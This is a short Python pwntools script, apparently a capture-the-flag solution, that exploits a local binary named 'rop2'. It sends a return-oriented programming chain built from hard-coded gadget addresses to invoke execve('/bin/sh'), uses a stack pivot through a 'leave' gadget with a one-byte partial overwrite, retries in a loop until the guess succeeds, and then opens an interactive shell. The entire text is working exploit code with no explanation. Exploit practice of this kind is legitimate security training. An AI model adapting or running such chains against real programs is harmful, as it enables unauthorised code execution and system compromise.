#!/usr/bin/env python

from pwn import *

context.arch='amd64'

pop_rdi = 0x401516
pop_rdx_rsi = 0x442909
pop_rax = 0x42678b
pop_rbp = 0x4004d1
leave = 0x4009e4
syscall = 0x4672b5
buf2 = 0x6ccd60

rop2 = (p64(pop_rdi) + p64(buf2) +
        p64(pop_rdx_rsi) + p64(0) + p64(0) +
        p64(pop_rax) + p64(59) +
        p64(syscall))
rop2_offset = 64

while True:
    r = process('./rop2')
    r.send('/bin/sh\x00'.ljust(rop2_offset) + rop2)
    r.recvuntil('\n')
    r.send((p64(pop_rbp) + p64(buf2 + rop2_offset - 8) +
            p64(leave)).ljust(32) + '\x08')
    r.recvuntil('\n')
    try:
        r.send('id\n')
        r.recvline()
    except EOFError:
        r.close()
    else:
        break

r.interactive()
